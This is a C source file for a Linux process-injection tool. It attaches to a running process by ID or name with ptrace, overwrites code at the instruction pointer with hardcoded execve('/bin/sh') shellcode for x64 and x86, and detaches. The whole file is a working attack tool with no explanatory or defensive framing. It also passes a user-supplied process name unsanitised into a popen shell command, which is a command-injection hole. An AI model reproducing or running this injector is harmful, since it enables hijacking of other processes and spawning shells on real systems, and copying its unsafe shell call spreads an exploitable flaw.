#include<stdio.h>
#include<stdlib.h>
#include<stdbool.h>
#include<stdint.h>
#include<string.h>

#include<ctype.h>

#include<sys/ptrace.h>
#include<sys/user.h>
#include<sys/wait.h>

#ifndef BYTE
typedef unsigned char BYTE;
struct assem_instructor { BYTE _shellcode_[512]; } assem_ins;
#endif

void usage( char *__msg, bool __exit, int __code );
bool AttachToPID( unsigned int __pid );
bool GetRegisters(
				struct user_regs_struct *__regs,
				unsigned int __pid
		 );
bool InjectShellcode(
				struct user_regs_struct *__regs,
				//void *__rip,
				unsigned int __pid,
				BYTE __shelcode[],
				unsigned int __shellcode_size
		    );
bool DetachFromPID( unsigned int __pid );

////////////////////////////
// ARCHITECTURE LINUX x64
char _shellcode_x64_[] = { 0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53, // EXEC VIA=/bin/sh
			   0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x08,0x00, // CMD=/bin/sh
			   0x00,0x00,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x56,0x57,0x48,0x89,0xe6,
											    0x0f,0x05 };
// ARCHITECTURE LINUX x86
char _shellcode_x86_[] = { 0x6a,0x0b,0x58,0x99,0x52,0x66,0x68,0x2d,0x63,0x89,0xe7,0x68,0x2f,0x73,0x68, // EXEC VIA=/bin/sh
			   0x00,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x52,0xe8,0x08,0x00,0x00,0x00,0x2f, // CMD=/bin/sh
			   0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x57,0x53,0x89,0xe1,0xcd,0x80 };
////////////////////////////

int main(
		int argc,
		char ** argv
	) {

	#define USAGE "\nUsage: $ ./inject [-p PROCESS ID | -n PROCESS NAME]\n\n"
	if(!argv[1] || !argv[2]) usage(USAGE, true, -1);

	pid_t pid;
	char cchoice;
	char processName[128];
	bool use_pname = false;

	cchoice = tolower(argv[1][1]);
	int choice = (int)cchoice;

//	do {
		switch(choice) {
			case 112:
				pid = atoi(argv[2]);
				break;
			case 110:
				snprintf(processName, sizeof(processName), "%s", argv[2]);
				use_pname = true;
				break;
			default:
				usage(USAGE, false, 0);
				exit(-1);
		}
//	} while(!pid);

	struct assem_instructor __injector;
	if ((size_t)-1 > 0xffffffffUL) {
		memset(__injector._shellcode_, '\0', sizeof(__injector._shellcode_));
		memcpy(__injector._shellcode_, _shellcode_x64_, sizeof(_shellcode_x64_));
	}
    	else {
		memset(__injector._shellcode_, '\0', sizeof(__injector._shellcode_));
		memcpy(__injector._shellcode_, _shellcode_x86_, sizeof(_shellcode_x86_));
	}
	struct assem_instructor *injector = &__injector;

	if(use_pname) {
		char command[256]; char result[32];
		snprintf(command, sizeof(command), "ps -h | grep %s | awk {'print $1'} | head -n 1", processName);
		FILE *fp = popen(command, "r");
		fgets(result, sizeof(result), fp);
		pid = atoi(result);
		printf("[!] Found Process ID %d From Process Name %s\n\n", pid, processName);
	}



	struct user_regs_struct ASSEMREGS;
	bool attached = AttachToPID( pid );
	printf("\033[0m[+] Process Attachment Status: %s\n", attached?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");

	wait(NULL);
	bool registered = GetRegisters( &ASSEMREGS, pid );
//	if((ptrace(PTRACE_GETREGS, pid, 0, &ASSEMREGS)) < 0) {
//		 registered = false;
//	} else { registered = true; }
	printf("[+] Registers Read Status: %s\n", registered?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");

	printf("[+] Injecting Shellcode Into Current RIP Address [%x]\n", ASSEMREGS.rip);
	bool injected = InjectShellcode( &ASSEMREGS, pid, injector->_shellcode_, sizeof(injector->_shellcode_));
	printf("[+] Injection Status: %s\n",  injected?"\033[01;32mSuccess\033[0m":"\033[01;31mFailed\033[0m");

	printf("\nDetaching ... ");
	bool detached = DetachFromPID( pid );
	if (detached) printf("Done.\n");

	return 0;
}

void usage( char *__msg, bool __exit, int __code ) {
	printf(__msg); if(__exit) exit(__code);
}
bool AttachToPID( unsigned int __pid ) {
	if((ptrace(PTRACE_ATTACH, __pid, NULL, 0)) < 0) return false;
	return true;
}
bool GetRegisters(
				struct user_regs_struct *__regs,
				unsigned int __pid
		 ) {
	if((ptrace(PTRACE_GETREGS, __pid, 0, *(&__regs))) < 0) return false;
	return true;
}
bool InjectShellcode(
				struct user_regs_struct *__regs,
				//void *__rip,
				unsigned int __pid,
				BYTE __shellcode[],
				unsigned int __shellcode_size
		     ) {
	for(int i = 0; i < __shellcode_size; i++) ptrace(PTRACE_POKETEXT, __pid, __regs->rip+i, *(int*)(__shellcode + i));
	return true;
}
bool DetachFromPID( unsigned int __pid ) {
	if((ptrace(PTRACE_DETACH, __pid, NULL, 0)) < 0) return false;
	return true;
}
